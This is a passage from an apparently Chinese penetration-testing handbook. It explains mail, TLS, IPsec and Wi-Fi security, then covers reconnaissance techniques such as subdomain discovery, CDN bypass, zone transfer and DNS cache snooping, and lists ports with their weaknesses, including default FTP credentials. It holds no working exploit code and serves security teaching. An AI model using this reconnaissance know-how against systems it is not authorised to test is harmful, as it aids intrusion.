id='rfc-3'><span>RFC</span></h4><ul><li><a href='https://tools.ietf.org/html/rfc3253'><span>RFC 3253</span></a><span> Versioning Extensions to WebDAV (Web Distributed Authoring and Versioning)</span></li><li><a href='https://tools.ietf.org/html/rfc3648'><span>RFC 3648</span></a><span> Web Distributed Authoring and Versioning (WebDAV) Ordered Collections Protocol</span></li><li><a href='https://tools.ietf.org/html/rfc3744'><span>RFC 3744</span></a><span> Web Distributed Authoring and Versioning (WebDAV) Access Control Protocol</span></li><li><a href='https://tools.ietf.org/html/rfc4437'><span>RFC 4437</span></a><span> Web Distributed Authoring and Versioning (WebDAV) Redirect Reference Resources</span></li><li><a href='https://tools.ietf.org/html/rfc4918'><span>RFC 4918</span></a><span> HTTP Extensions for Web Distributed Authoring and Versioning (WebDAV)</span></li><li><a href='https://tools.ietf.org/html/rfc5323'><span>RFC 5323</span></a><span> Web Distributed Authoring and Versioning (WebDAV) SEARCH</span></li><li><a href='https://tools.ietf.org/html/rfc5842'><span>RFC 5842</span></a><span> Binding Extensions to Web Distributed Authoring and Versioning (WebDAV)</span></li></ul><h4 id='blog-1'><span>Blog</span></h4><ul><li><a href='http://2015.zeronights.org/assets/files/35-Egorov.pdf'><span>What should a hacker know about WebDav</span></a></li><li><a href='http://www.ruanyifeng.com/blog/2019/09/cookie-samesite.html'><span>Cookie 的 SameSite 属性</span></a></li><li><a href='http://www.ruanyifeng.com/blog/2016/08/http.html'><span>HTTP 协议入门</span></a></li></ul><p>&nbsp;</p><h2 id='28--邮件协议族'><span>2.8  邮件协议族</span></h2><h3 id='281--简介'><span>2.8.1  简介</span></h3><h4 id='smtp'><span>SMTP</span></h4><blockquote><p><span>SMTP (Simple Mail Transfer Protocol) 是一种电子邮件传输的协议，是一组用于从源地址到目的地址传输邮件的规范。不启用 SSL 时端口号为 25，启用 SSL 时端口号多为 465 或 994。</span></p></blockquote><h4 id='pop3'><span>POP3</span></h4><blockquote><p><span>POP3 (Post Office Protocol 3) 用于支持使用客户端远程管理在服务器上的电子邮件。不启用 SSL 时端口号为 110，启用 SSL 时端口号多为 995。</span></p></blockquote><h4 id='imap'><span>IMAP</span></h4><blockquote><p><span>IMAP (Internet Mail Access Protocol)，即交互式邮件存取协议，它是跟 POP3 类似邮件访问标准协议之一。不同的是，开启了 IMAP 后，您在电子邮件客户端收取的邮件仍然保留在服务器上，同时在客户端上的操作都会反馈到服务器上，如：删除邮件，标记已读等，服务器上的邮件也会做相应的动作。不启用 SSL 时端口号为 143，启用 SSL 时端口号多为 993。</span></p></blockquote><h3 id='282--防护策略'><span>2.8.2  防护策略</span></h3><h4 id='spf'><span>SPF</span></h4><blockquote><p><span>发件人策略框架 (Sender Policy Framework, SPF) 是一套电子邮件认证机制，用于确认电子邮件是否由网域授权的邮件服务器寄出，防止有人伪冒身份网络钓鱼或寄出垃圾邮件。SPF 允许管理员设定一个 DNS TXT记录或 SPF 记录设定发送邮件服务器的 IP 范围，如有任何邮件并非从上述指明授权的 IP 地址寄出，则很可能该邮件并非确实由真正的寄件者寄出。</span></p></blockquote><h4 id='dkim'><span>DKIM</span></h4><blockquote><p><span>域名密钥识别邮件 (DomainKeys Identified Mail, DKIM) 是一种检测电子邮件发件人地址伪造的方法。发送方会在邮件的头中插入 DKIM-Signature，收件方通过查询 DNS 记录中的公钥来验证发件人的信息。</span></p></blockquote><h4 id='dmarc'><span>DMARC</span></h4><blockquote><p><span>基于网域的消息认证、报告和一致性 (Domain-based Message Authentication, Reporting and Conformance, DMARC) 是电子邮件身份验证协议，用于解决在邮件栏中显示的域名和验证的域名不一致的问题。要通过 DMARC 检查，必须通过 SPF 或/和 DKIM 的身份验证， 需要标头地址中的域名必须与经过身份验证的域名一致。</span></p></blockquote><h3 id='283--参考链接'><span>2.8.3  参考链接</span></h3><h4 id='rfc-4'><span>RFC</span></h4><ul><li><a href='https://tools.ietf.org/html/rfc4408'><span>RFC 4408 Sender Policy Framework (SPF) for Authorizing Use of Domains in E-Mail, Version 1</span></a></li><li><a href='https://tools.ietf.org/html/rfc6376'><span>RFC 6376 DomainKeys Identified Mail (DKIM) Signatures</span></a></li><li><a href='https://tools.ietf.org/html/rfc7208'><span>RFC 7208 Sender Policy Framework (SPF) for Authorizing Use of Domains in Email, Version 1</span></a></li><li><a href='https://tools.ietf.org/html/rfc7489'><span>RFC 7489 Domain-based Message Authentication, Reporting, and Conformance (DMARC)</span></a></li><li><a href='https://tools.ietf.org/html/rfc8301'><span>RFC 8301 Cryptographic Algorithm and Key Usage Update to DomainKeys Identified Mail (DKIM)</span></a></li><li><a href='https://tools.ietf.org/html/rfc8463'><span>RFC 8463 A New Cryptographic Signature Method for DomainKeys Identified Mail (DKIM)</span></a></li><li><a href='https://tools.ietf.org/html/rfc8616'><span>RFC 8616 Email Authentication for Internationalized Mail</span></a></li><li><a href='https://tools.ietf.org/html/rfc8611'><span>RFC 8611 Mail</span></a></li></ul><h4 id='相关文档'><span>相关文档</span></h4><ul><li><a href='https://en.wikipedia.org/wiki/Sender_Policy_Framework'><span>Sender Policy Framework wikipedia</span></a></li><li><a href='https://en.wikipedia.org/wiki/DomainKeys_Identified_Mail'><span>DomainKeys Identified Mail wikipedia</span></a></li><li><a href='https://en.wikipedia.org/wiki/DMARC'><span>DMARC wikipedia</span></a></li></ul><h4 id='研究文章-2'><span>研究文章</span></h4><ul><li><a href='http://i.blackhat.com/USA-20/Thursday/us-20-Chen-You-Have-No-Idea-Who-Sent-That-Email-18-Attacks-On-Email-Sender-Authentication-wp.pdf'><span>Composition Kills:A Case Study of Email Sender Authentication</span></a></li></ul><p>&nbsp;</p><h2 id='29--ssltls'><span>2.9  SSL/TLS</span></h2><h3 id='291--简介'><span>2.9.1  简介</span></h3><blockquote><p><span>SSL 全称是 Secure Sockets Layer，安全套接字层，它是由网景公司 (Netscape) 在 1994 年时设计，主要用于 Web 的安全传输协议，目的是为网络通信提供机密性、认证性及数据完整性保障。如今，SSL 已经成为互联网保密通信的工业标准。</span></p><p><span>SSL 最初的几个版本 (SSL 1.0、SSL2.0、SSL 3.0) 由网景公司设计和维护，从 3.1 版本开始，SSL 协议由因特网工程任务小组 (IETF) 正式接管，并更名为 TLS(Transport Layer Security)，发展至今已有 TLS 1.0、 TLS1.1、TLS1.2、TLS1.3 这几个版本。</span></p><p><span>如 TLS 名字所说，SSL/TLS 协议仅保障传输层安全。同时，由于协议自身特性 (数字证书机制)，SSL/TLS</span></p><p><span>不能被用于保护多跳 (multi-hop) 端到端通信，而只能保护点到点通信。</span></p><p><span>SSL/TLS 协议能够提供的安全目标主要包括如下几个：</span></p></blockquote><ul><li><h6 id='认证性'><span>认证性</span></h6><ul><li><span>借助数字证书认证服务端端和客户端身份，防止身份伪造</span></li></ul></li><li><h6 id='机密性'><span>机密性</span></h6><ul><li><span>借助加密防止第三方窃听</span></li></ul></li><li><h6 id='完整性'><span>完整性</span></h6><ul><li><span>借助消息认证码 (MAC) 保障数据完整性，防止消息篡改</span></li></ul></li><li><h6 id='重放保护'><span>重放保护</span></h6><ul><li><span>通过使用隐式序列号防止重放攻击</span></li></ul></li></ul><blockquote><p><span>为了实现这些安全目标，SSL/TLS 协议被设计为一个两阶段协议，分为握手阶段和应用阶段：</span></p><p><span>握手阶段也称协商阶段，在这一阶段，客户端和服务端端会认证对方身份 (依赖于 PKI 体系，利用数字证书进行身份认证)，并协商通信中使用的安全参数、密码套件以及 MasterSecret。后续通信使用的所有密钥都是通过 MasterSecret 生成。在握手阶段完成后，进入应用阶段。在应用阶段通信双方使用握手阶段协商好的密钥进行安全通信。</span></p></blockquote><h3 id='292--协议'><span>2.9.2  协议</span></h3><blockquote><p><span>TLS 包含几个子协议，比较常用的有记录协议、警报协议、握手协议、变更密码规范协议等。</span></p></blockquote><h4 id='记录协议'><span>记录协议</span></h4><blockquote><p><span>记录协议 (Record Protocol) 规定了 TLS 收发数据的基本单位记录 (record)。</span></p></blockquote><h4 id='警报协议'><span>警报协议</span></h4><blockquote><p><span>警报协议 (Alert Protocol) 用于提示协议交互过程出现错误。</span></p></blockquote><h4 id='握手协议'><span>握手协议</span></h4><blockquote><p><span>握手协议 (Handshake Protocol) 是 TLS 里最复杂的子协议，在握手过程中协商 TLS 版本号、随机数、密码套件等信息，然后交换证书和密钥参数，最终双方协商得到会话密钥，用于后续的混合加密系统。</span></p></blockquote><h4 id='变更密码规范协议'><span>变更密码规范协议</span></h4><blockquote><p><span>变更密码规范协议 (Change Cipher Spec Protocol) 是一个</span>“<span>通知</span>”<span>，告诉对方，后续的数据都将使用加密保护。</span></p></blockquote><h3 id='293--交互过程'><span>2.9.3  交互过程</span></h3><h4 id='client-hello'><span>Client Hello</span></h4><blockquote><p><span>Client Hello 由客户端发送，内容包括客户端的一个 Unix 时间戳 (GMT Unix Time)、一些随机的字节 (Random Bytes)，还包括了客户端接受的算法类型 (Cipher Suites)。</span></p></blockquote><h4 id='server-hello'><span>Server Hello</span></h4><blockquote><p><span>Server Hello 由服务端发送，内容包括服务端支持的算法类型、GMT Unix Time 以及 Random Bytes。</span></p></blockquote><h4 id='certificate'><span>Certificate</span></h4><blockquote><p><span>由服务端或者客户端发送，发送方会会将自己的数字证书发送给接收方，由接收方进行证书验证，如果不通过的话，接收方会中断握手的过程。一般跟在 Client / Server Hello 报文之后。</span></p></blockquote><h4 id='server-key-exchange'><span>Server Key Exchange</span></h4><blockquote><p><span>由服务端发送，将自己的公钥参数传输给了客户端，一般也和 Server Hello 与 Certificate 在一个 TCP 报文中。</span></p></blockquote><h4 id='server-hello-done'><span>Server Hello Done</span></h4><blockquote><p><span>服务端发送，一般也和 Server Hello、Certificate 和 Server Key Exchange 在一个 TCP 报文中。</span></p></blockquote><h4 id='client-key-exchange'><span>Client Key Exchange</span></h4><blockquote><p><span>客户端发送，向服务端发送自己的公钥参数，与服务端协商密钥。</span></p></blockquote><h4 id='change-cipher-spec'><span>Change Cipher Spec</span></h4><blockquote><p><span>客户端或者服务端发送，紧跟着 Key Exchange 发送，代表自己生成了新的密钥，通知对方以后将更换密钥，使用新的密钥进行通信。</span></p></blockquote><h4 id='encrypted-handshake-message'><span>Encrypted Handshake Message</span></h4><blockquote><p><span>客户端或者服务端发送，紧跟着 Key Exchange 发送。进行测试，一方用自己的刚刚生成的密钥加密一段固定的消息发送给对方，如果密钥协商正确无误的话，对方可以正确解密。</span></p></blockquote><h4 id='new-session-ticket'><span>New Session Ticket</span></h4><blockquote><p><span>服务端发送，表示发起会话，在一段时间之内 (超时时间到来之前)，双方都以刚刚交换的密钥进行通信。从这以后，加密通信正式开始。</span></p></blockquote><h4 id='application-data'><span>Application Data</span></h4><blockquote><p><span>使用密钥交换协议协商出来的密钥加密的应用层的数据。</span></p></blockquote><h4 id='encrypted-alert'><span>Encrypted Alert</span></h4><blockquote><p><span>客户端或服务端发送，意味着加密通信因为某些原因需要中断，警告对方不要再发送敏感的数据。</span></p></blockquote><h3 id='294--版本更新内容'><span>2.9.4  版本更新内容</span></h3><h4 id='tls-13'><span>TLS 1.3</span></h4><ul><li><p><span>引入了 PSK 作为新的密钥协商机制</span></p></li><li><p><span>支持 0-RTT 模式，以安全性降低为代价，在建立连接时节省了往返时间</span></p></li><li><p><span>ServerHello 之后的所有握手消息采取了加密操作，可见明文减少</span></p></li><li><p><span>不再允许对加密报文进行压缩、不再允许双方发起重协商</span></p></li><li><p><span>DSA 证书不再允许在 TLS 1.3 中使用</span></p></li><li><h5 id='删除不安全的密码算法'><span>删除不安全的密码算法</span></h5><ul><li><span>RSA 密钥传输 - 不支持前向安全性</span></li><li><span>CBC 模式密码 - 易受 BEAST 和 Lucky 13 攻击</span></li><li><span>RC4 流密码 - 在 HTTPS 中使用并不安全</span></li><li><span>SHA-1 哈希函数 - 建议以 SHA-2 取而代之</span></li><li><span>任意 Diffie-Hellman 组- CVE-2016-0701 漏洞</span></li><li><span>输出密码 - 易受 FREAK 和 LogJam 攻击</span></li></ul></li></ul><h3 id='295--子协议'><span>2.9.5  子协议</span></h3><blockquote><p><span>SSL/TLS 协议有一个高度模块化的架构，分为很多子协议，主要是：</span></p></blockquote><ul><li><h6 id='handshake-协议'><span>Handshake 协议</span></h6><ul><li><span>包括协商安全参数和密码套件、服务端身份认证 (客户端身份认证可选)、密钥交换</span></li></ul></li><li><h6 id='changecipherspec-协议'><span>ChangeCipherSpec 协议</span></h6><ul><li><span>一条消息表明握手协议已经完成</span></li></ul></li><li><h6 id='alert-协议'><span>Alert 协议</span></h6><ul><li><span>对握手协议中一些异常的错误提醒，分为 fatal 和 warning 两个级别，fatal 类型的错误会直接中断 SSL 链接，而 warning 级别的错误 SSL 链接仍可继续，只是会给出错误警告</span></li></ul></li><li><h6 id='record-协议'><span>Record 协议</span></h6><ul><li><span>包括对消息的分段、压缩、消息认证和完整性保护、加密等</span></li></ul></li></ul><h3 id='296--参考链接'><span>2.9.6  参考链接</span></h3><h4 id='rfc-5'><span>RFC</span></h4><ul><li><a href='https://tools.ietf.org/html/rfc2246'><span>RFC 2246 The TLS Protocol Version 1.0</span></a></li><li><a href='https://tools.ietf.org/html/rfc4346'><span>RFC 4346 The Transport Layer Security (TLS) Protocol Version 1.1</span></a></li><li><a href='https://tools.ietf.org/html/rfc5246'><span>RFC 5246 The Transport Layer Security (TLS) Protocol Version 1.2</span></a></li><li><a href='https://tools.ietf.org/html/rfc6101'><span>RFC 6101 The Secure Sockets Layer (SSL) Protocol Version 3.0</span></a></li><li><a href='https://tools.ietf.org/html/rfc6176'><span>RFC 6176 Prohibiting Secure Sockets Layer (SSL) Version 2.0</span></a></li><li><a href='https://tools.ietf.org/html/rfc7568'><span>RFC 7568 Deprecating Secure Sockets Layer Version 3.0</span></a></li><li><a href='https://tools.ietf.org/html/rfc8446'><span>RFC 8446 The Transport Layer Security (TLS) Protocol Version 1.3</span></a></li></ul><h4 id='document'><span>Document</span></h4><ul><li><a href='https://en.wikipedia.org/wiki/Transport_Layer_Security'><span>Wikipedia Transport Layer Security</span></a></li></ul><p>&nbsp;</p><h2 id='210--ipsec'><span>2.10  IPsec</span></h2><h3 id='2101--简介'><span>2.10.1  简介</span></h3><blockquote><p><span>IPsec（IP Security）是 IETF 制定的三层隧道加密协议，它为 Internet 上传输的数据提供了高质量的、可互操作的、基于密码学的安全保证。特定的通信方之间在 IP 层通过加密与数据源认证等方式，提供了以下的安全服务：</span></p></blockquote><ul><li><h5 id='数据机密性confidentiality）'><span>数据机密性（Confidentiality）</span></h5><ul><li><span>IPsec 发送方在通过网络传输包前对包进行加密。</span></li></ul></li><li><h5 id='数据完整性data-integrity）'><span>数据完整性（Data Integrity）</span></h5><ul><li><span>IPsec 接收方对发送方发送来的包进行认证，以确保数据在传输过程中没有被篡改。</span></li></ul></li><li><h5 id='数据来源认证data-authentication）'><span>数据来源认证（Data Authentication）</span></h5><ul><li><span>IPsec 在接收端可以认证发送 IPsec 报文的发送端是否合法。</span></li></ul></li><li><h5 id='防重放anti-replay）'><span>防重放（Anti-Replay）</span></h5><ul><li><span>IPsec 接收方可检测并拒绝接收过时或重复的报文。</span></li></ul></li></ul><h3 id='2102--优点'><span>2.10.2  优点</span></h3><blockquote><p><span>IPsec 具有以下优点：</span></p></blockquote><ul><li><span>支持 IKE（Internet Key Exchange，因特网密钥交换），可实现密钥的自动协商功能，减少了密钥协商的开销。可以通过 IKE 建立和维护 SA 的服务，简化了 IPsec 的使用和管理。</span></li><li><span>所有使用 IP 协议进行数据传输的应用系统和服务都可以使用 IPsec，而不必对这些应用系统和服务本身做任何修改。</span></li><li><span>对数据的加密是以数据包为单位的，而不是以整个数据流为单位，这不仅灵活而 有助于进一步提高</span></li></ul><blockquote><p><span>IP 数据包的安全性，可以有效防范网络攻击。</span></p></blockquote><h3 id='2103--构成'><span>2.10.3  构成</span></h3><blockquote><p><span>IPsec 由四部分内容构成：</span></p></blockquote><ul><li><span>负责密钥管理的 Internet 密钥交换协议 IKE（Internet Key Exchange Protocol）</span></li><li><span>负责将安全服务与使用该服务的通信流相联系的安全关联 SA（Security Associations）</span></li><li><span>直接操作数据包的认证头协议 AH（IP Authentication Header）和安全载荷协议 ESP（IP Encapsulating Security Payload）</span></li><li><span>若干用于加密和认证的算法</span></li></ul><h3 id='2104--安全联盟security-associationsa）'><span>2.10.4  安全联盟（Security Association，SA）</span></h3><blockquote><ol start='' ><li><span>IPsec 在两个端点之间提供安全通信，端点被称为 IPsec 对等体。</span></li><li><span>SA 是 IPsec 的基础，也是 IPsec 的本质。SA 是通信对等体间对某些要素的约定，例如，使用哪种协议（AH、 ESP 还是两者结合使用）、协议的封装模式（传输模式和隧道模式）、加密算法（DES、3DES 和 AES）、特定流中保护数据的共享密钥以及密钥的生存周期等。建立 SA 的方式有手工配置和 IKE 自动协商两种。</span></li><li><span>SA 是单向的，在两个对等体之间的双向通信，最少需要两个 SA 来分别对两个方向的数据流进行安全保护。同时，如果两个对等体希望同时使用 AH 和 ESP 来进行安全通信，则每个对等体都会针对每一种协议来构建一个独立的 SA。</span></li><li><span>SA 由一个三元组来唯一标识，这个三元组包括 SPI（Security Parameter Index，安全参数索引）、目的 IP</span></li><li><span>地址、安全协议号（AH 或 ESP）。</span></li><li><span>SPI 是用于唯一标识 SA 的一个 32 比特数值，它在 AH 和 ESP 头中传输。在手工配置 SA 时，需要手工指定 SPI 的取值。使用 IKE 协商产生 SA 时，SPI 将随机生成。</span></li></ol></blockquote><h3 id='2105--ike'><span>2.10.5  IKE</span></h3><blockquote><ol start='' ><li><span>IKE（RFC2407，RFC2408、RFC2409）属于一种混合型协议，由 Internet 安全关联和密钥管理协议（ISAKMP）和两种密钥交换协议 OAKLEY 与 SKEME 组成。IKE 创建在由 ISAKMP 定义的框架上，沿用了 OAKLEY的密钥交换模式以及 SKEME 的共享和密钥更新技术，还定义了它自己的两种密钥交换方式。</span></li><li><span>IKE 使用了两个阶段的 ISAKMP：</span></li><li><span>第一阶段，协商创建一个通信信道（IKE SA），并对该信道进行验证，为双方进一步的 IKE 通信提供机密性、消息完整性以及消息源验证服务；第二阶段，使用已建立的 IKE SA 建立 IPsec SA（V2 中叫 Child SA）。</span></li></ol></blockquote><p>&nbsp;</p><h2 id='211--wi-fi'><span>2.11  Wi-Fi</span></h2><h3 id='2111--简介'><span>2.11.1  简介</span></h3><blockquote><p><span>Wi-Fi 又称</span>“<span>无线热点</span>”<span>或</span>“<span>无线网络</span>”<span>，是 Wi-Fi 联盟的商标，一个基于 IEEE 802.11 标准的无线局域网技术。</span></p></blockquote><h3 id='2112--攻击'><span>2.11.2  攻击</span></h3><h4 id='暴力破解'><span>暴力破解</span></h4><blockquote><p><span>WiFi 密码是基于预置的秘钥，可以通过抓取报文的方式在本地快速的批量进行密码爆破尝试。</span></p></blockquote><h4 id='伪造热点'><span>伪造热点</span></h4><blockquote><p><span>AP 可以动态的广播自己，客户也可以主动发送探针请求。可以伪造 AP 发送对探针请求的响应包，来让客户端错误的识别。</span></p></blockquote><h4 id='秘钥重装攻击'><span>秘钥重装攻击</span></h4><blockquote><p><span>该漏洞由 Vanhoef 发现。Wi-Fi 在握手时双方会更新秘钥，该攻击通过重放握手信息，令客户端重新安装相同的秘钥。</span></p></blockquote><h4 id='dragonblood'><span>Dragonblood</span></h4><blockquote><p><span>最新版的 WPA3 标准在实现上存在一些问题，同样由 Vanhoef 发现。包含拒绝服务攻击、降级攻击、侧信道泄露等。</span></p></blockquote><h3 id='2113--参考链接'><span>2.11.3  参考链接</span></h3><ul><li><a href='https://www.wi-fi.org/'><span>Wi-Fi Alliance</span></a></li><li><a href='https://papers.mathyvanhoef.com/dragonblood.pdf'><span>Dragonblood</span></a><span> : Analyzing the Dragonfly Handshake of WPA3 and EAP-pwd</span></li><li><a href='https://papers.mathyvanhoef.com/nordsec2019.pdf'><span>Improving Privacy through Fast Passive Wi-Fi Scanning</span></a></li><li><a href='https://papers.mathyvanhoef.com/asiaccs2019.pdf'><span>Practical Side-Channel Attacks against WPA-TKIP</span></a></li><li><a href='https://papers.mathyvanhoef.com/blackhat-eu2017.pdf'><span>Key Reinstallation Attacks: Breaking the WPA2 Protocol</span></a></li><li><a href='https://tools.ietf.org/html/rfc7664'><span>RFC 7664 Dragonfly Key Exchange</span></a></li></ul><p><span id="_bookmark17" class="anchor"></span><span>CHAPTER 3</span></p><p>&nbsp;</p><h1 id='3--信息收集'><span>3.  信息收集</span></h1><h2 id='31--网络入口信息'><span>3.1  网络入口/信息</span></h2><ul><li><h5 id='网络拓扑信息'><span>网络拓扑信息</span></h5><ul><li><span>外网出口</span></li></ul></li><li><h5 id='ip-信息'><span>IP 信息</span></h5><ul><li><span>C 段</span></li></ul></li><li><h5 id='线下网络'><span>线下网络</span></h5></li><li><h5 id='wi-fi-1'><strong><span>Wi-Fi</span></strong></h5><ul><li><span>SSID</span></li><li><span>认证信息</span></li></ul></li><li><h5 id='vpn'><span>VPN</span></h5><ul><li><span>厂商</span></li><li><span>登录方式</span></li></ul></li><li><h5 id='邮件网关'><span>邮件网关</span></h5></li><li><h5 id='手机-app'><span>手机 APP</span></h5></li><li><h5 id='小程序后台'><span>小程序后台</span></h5></li><li><h5 id='oa'><span>OA</span></h5></li><li><h5 id='sso-1'><span>SSO</span></h5></li><li><h5 id='边界网络设备'><span>边界网络设备</span></h5></li><li><h5 id='上游运营商'><span>上游运营商</span></h5></li></ul><p>&nbsp;</p><h2 id='32--域名信息'><span>3.2  域名信息</span></h2><h3 id='321--whois'><span>3.2.1  Whois</span></h3><blockquote><p><a href='https://www.whois.com/'><span>Whois</span></a><span> 可以查询域名是否被注册，以及注册域名的详细信息的数据库，其中可能会存在一些有用的信息，例如域名所有人、域名注册商、邮箱等。</span></p></blockquote><h3 id='322--搜索引擎搜索'><span>3.2.2  搜索引擎搜索</span></h3><blockquote><p><span>搜索引擎通常会记录域名信息，可以通过 site: domain 的语法来查询。</span></p></blockquote><h3 id='323--第三方查询'><span>3.2.3  第三方查询</span></h3><blockquote><p><span>网络中有相当多的第三方应用提供了子域的查询功能，下面有一些例子，更多的网站可以在 8.1 工具列表中查找。</span></p></blockquote><ul><li><a href='https://dnsdumpster.com/'><span>DNSDumpster</span></a></li><li><a href='https://www.virustotal.com/'><span>Virustotal</span></a></li><li><span>CrtSearch</span></li><li><span>threatminer</span></li><li><span>Censys</span></li></ul><h3 id='324--asn-信息关联'><span>3.2.4  ASN 信息关联</span></h3><blockquote><p><span>在网络中一个自治系统 (Autonomous System, AS) 是一个有权自主地决定在本系统中应采用何种路由协议的小型单位。这个网络单位可以是一个简单的网络也可以是一个由一个或多个普通的网络管理员来控制的网络群体，它是一个单独的可管理的网络单元 (例如一所大学，一个企业或者一个公司个体) 。</span></p><p><span>一个自治系统有时也被称为是一个路由选择域 (routing domain) 。一个自治系统将会分配一个全局的唯一的 16 位号码，这个号码被称为自治系统号 (ASN) 。因此可以通过 ASN 号来查找可能相关的 IP，例如：</span></p></blockquote><h3 id='325--域名相关性'><span>3.2.5  域名相关性</span></h3><blockquote><p><span>同一个企业/个人注册的多个域名通常具有一定的相关性，例如使用了同一个邮箱来注册、使用了同一个备案、同一个负责人来注册等，可以使用这种方式来查找关联的域名。一种</span><strong><span>操作步骤</span></strong><span>如下：</span></p></blockquote><ul><li><span>查询域名注册邮箱</span></li><li><span>通过域名查询备案号</span></li><li><span>通过备案号查询域名</span></li><li><span>反查注册邮箱</span></li><li><span>反查注册人</span></li><li><span>通过注册人查询到的域名在查询邮箱</span></li><li><span>通过上一步邮箱去查询域名</span></li><li><span>查询以上获取出的域名的子域名</span></li></ul><h3 id='326--网站信息利用'><span>3.2.6  网站信息利用</span></h3><blockquote><p><span>网站中有相当多的信息，网站本身、各项安全策略、设置等都可能暴露出一些信息。</span></p><p><span>网站本身的交互通常不囿于单个域名，会和其他子域交互。对于这种情况，可以通过爬取网站，收集站点中的其他子域信息。这些信息通常出现在 JavaScript 文件、资源文件链接等位置。</span></p><p><span>网站的安全策略如跨域策略、CSP 规则等通常也包含相关域名的信息。有时候多个域名为了方便会使用同一个 SSL/TLS 证书，因此有时可通过证书来获取相关域名信息。</span></p></blockquote><h3 id='327--https-证书'><span>3.2.7  HTTPS 证书</span></h3><h4 id='证书透明度'><span>证书透明度</span></h4><blockquote><p><span>为了保证 HTTPS 证书不会被误发或伪造，CA 会将证书记录到可公开验证、不可篡改 只能附加内容的日志中，任何感兴趣的相关方都可以查看由授权中心签发的所有证书。因此可以通过查询已授权证书的方式来获得相关域名。</span></p></blockquote><h4 id='san'><span>SAN</span></h4><blockquote><p><span>主题备用名称 (Subject Alternate Name, SAN)，简单来说，在需要多个域名，并将其用于各项服务时，多使用 SAN 证书。SAN 允许在安全证书中使用 subjectAltName 字段将多种值与证书关联，这些值被称为主题备用名称。</span></p></blockquote><h3 id='328--域传送漏洞'><span>3.2.8  域传送漏洞</span></h3><blockquote><p><span>DNS 域传送 (zone transfer) 指的是冗余备份服务器使用来自主服务器的数据刷新自己的域 (zone) 数据库。这是为了防止主服务器因意外不可用时影响到整个域名的解析。</span></p><p><span>一般来说，域传送操作应该只允许可信的备用 DNS 服务器发起，但是如果错误配置了授权，那么任意用户都可以获得整个 DNS 服务器的域名信息。这种错误授权被称作是 DNS 域传送漏洞。</span></p></blockquote><h3 id='329--passive-dns'><span>3.2.9  Passive DNS</span></h3><blockquote><p><span>Passive DNS 被动的从递归域名服务器记录来自不同域名服务器的响应，形成数据库。利用 Passive DNS 数据库可以知道域名曾绑定过哪些 IP，IP 曾关联到哪些域名，域名最早/最近出现的时间，为测试提供较大的帮助。Virustotal、passivetotal、CIRCL 等网站都提供了 Passive DNS 数据库的查询。</span></p></blockquote><h3 id='3210--泛解析'><span>3.2.10  泛解析</span></h3><blockquote><p><span>泛解析是把 </span><em><span>*</span><span>.example.com</span></em><span> 的所有 A 记录都解析到某个 IP 地址上，在子域名枚举时需要处理这种情况以防生成大量无效的记录。</span></p></blockquote><h3 id='3211--重要记录'><span>3.2.11  重要记录</span></h3><h4 id='cname-2'><span>CNAME</span></h4><blockquote><p><span>CNAME 即 Canonical name，又称 alias，将域名指向另一个域名。其中可能包含其他关联业务的信息。很多网站使用的 CDN 加速功能利用了该记录。</span></p></blockquote><h4 id='mx-记录-2'><span>MX 记录</span></h4><blockquote><p><span>MX 记录即 Mail Exchanger，记录了发送电子邮件时域名对应的服务器地址。可以用来寻找 SMTP 服务器信息。</span></p></blockquote><h4 id='ns-记录-2'><span>NS 记录</span></h4><blockquote><p><span>NS (Name Server) 记录是域名服务器的记录，用来指定域名由哪个 DNS 服务器来进行解析。</span></p></blockquote><h4 id='spf-记录'><span>SPF 记录</span></h4><blockquote><p><span>SPF (Sender Policy Framework) 是为了防止垃圾邮件而提出来的一种 DNS 记录类型，是一种 TXT 类型的记录，用于登记某个域名拥有的用来外发邮件的所有 IP 地址。通过 SPF 记录可以获取相关的 IP 信息，常用命令为 dig example.com txt 。</span></p></blockquote><h3 id='3212--cdn'><span>3.2.12  CDN</span></h3><h4 id='cdn-验证'><span>CDN 验证</span></h4><blockquote><p><span>可通过多地 ping 的方式确定目标是否使用了 CDN，常用的网站有 </span><a href='http://ping.chinaz.com/' target='_blank' class='url'>http://ping.chinaz.com/</a><span> https:// asm.ca.com/en/ping.php 等。</span></p></blockquote><h4 id='域名查找'><span>域名查找</span></h4><blockquote><p><span>使用了 CDN 的域名的父域或者子域名不一定使用了 CDN，可以通过这种方式去查找对应的 IP。</span></p></blockquote><h4 id='历史记录查找'><span>历史记录查找</span></h4><blockquote><p><span>CDN 可能是在网站上线一段时间后才上线的，可以通过查找域名解析记录的方式去查找真实 IP。</span></p></blockquote><h4 id='邮件信息'><span>邮件信息</span></h4><blockquote><p><span>通过社会工程学的方式进行邮件沟通，从邮件头中获取 IP 地址，IP 地址可能是网站的真实 IP 或者是目标的出口 IP。</span></p></blockquote><h3 id='3213--子域爆破'><span>3.2.13  子域爆破</span></h3><blockquote><p><span>在内网等不易用到以上技巧的环境，或者想监测新域名上线时，可以通过批量尝试的方式，找到有效的域名。</span></p></blockquote><h3 id='3214--缓存探测技术'><span>3.2.14  缓存探测技术</span></h3><blockquote><p><span>在企业网络中通常都会配置 DNS 服务器为网络内的主机提供域名解析服务。域名缓存侦测（DNS Cache Snooping）技术就是向这些服务器发送域名解析请求，但并不要求使用递归模式，用于探测是否请求过某个域名。这种方式可以用来探测是否使用了某些软件，尤其是安全软件。</span></p></blockquote><p>&nbsp;</p><h2 id='33--端口信息'><span>3.3  端口信息</span></h2><h3 id='331--常见端口及其脆弱点'><span>3.3.1  常见端口及其脆弱点</span></h3><ul><li><h5 id='ftp-21tcp'><span>FTP (21/TCP)</span></h5><ul><li><span>默认用户名密码 anonymous:anonymous</span></li><li><span>暴力破解密码</span></li><li><span>VSFTP 某版本后门</span></li></ul></li><li><h5 id='ssh-22tcp'><span>SSH (22/TCP)</span></h5><ul><li><span>部分版本 SSH 存在漏洞可枚举用户名</span></li><li><span>暴力破解密码</span></li></ul></li><li><h5 id='telent-23tcp'><span>Telent (23/TCP)</span></h5><ul><li><span>暴力破解密码</span></li><li><span>嗅探抓取明文密码</span></li></ul></li><li><h5 id='smtp-25tcp'><span>SMTP (25/TCP)</span></h5><ul><li><span>无认证时可伪造发件人</span></li></ul></li><li><h5 id='dns-53udp'><span>DNS (53/UDP)</span></h5><ul><li><p><span>域传送漏洞</span></p></li><li><p><span>DNS 劫持</span></p></li><li><p><span>DNS 缓存投毒</span></p></li><li><p><span>DNS 欺骗</span></p></li><li><p><span>SPF / DMARC Check</span></p></li><li><h5 id='ddos-1'><span>DDoS</span></h5><ul><li><span>DNS Query Flood</span></li><li><span>DNS 反弹</span></li></ul></li><li><p><span>DNS 